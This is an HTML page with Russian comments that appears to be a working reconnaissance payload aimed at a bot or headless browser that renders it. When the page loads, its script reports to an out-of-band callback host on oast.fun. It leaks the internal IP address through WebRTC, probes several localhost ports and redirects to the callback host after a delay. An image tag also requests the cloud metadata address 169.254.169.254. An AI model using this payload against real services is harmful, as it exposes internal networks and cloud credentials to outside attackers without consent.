<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="dns-prefetch" href="http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun">
    <link rel="preconnect" href="http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun">
</head>
<body>
    <script>
        const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";

        // Функция-пуля: максимально быстрая отправка
        function send(path) {
            var n = new Image();
            n.src = oast + "/" + path + "?r=" + Math.random();
        }

        // 1. Сразу шлем сигнал, что JS стартанул
        send("JS_START_SUCCESS");

        // 2. Пытаемся вытянуть внутренний IP (WebRTC) - очень быстро
        try {
            var pc = new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => {
                if (e && e.candidate) {
                    var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
                    send("IP_LEAK_" + ip);
                }
            };
        } catch(err) { send("WEBRTC_ERROR"); }

        // 3. Сканим порты через фоновые картинки (без fetch!)
        const ports = [80, 8080, 3000, 9000];
        ports.forEach(p => {
            var img = new Image();
            img.src = "http://127.0.0.1:" + p + "/favicon.ico";
            img.onerror = () => send("PORT_HIT_" + p);
        });

        // 4. ГЛАВНЫЙ ТРЮК: Редирект в самом конце, чтобы бот не закрылся раньше времени
        setTimeout(() => {
            window.location.href = oast + "/FINAL_REDIRECT";
        }, 1500);
    </script>

    <img src="http://169.254.169.254/latest/meta-data/hostname" onerror="this.src='http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/METADATA_TRIGGERED'">
</body>
</html>
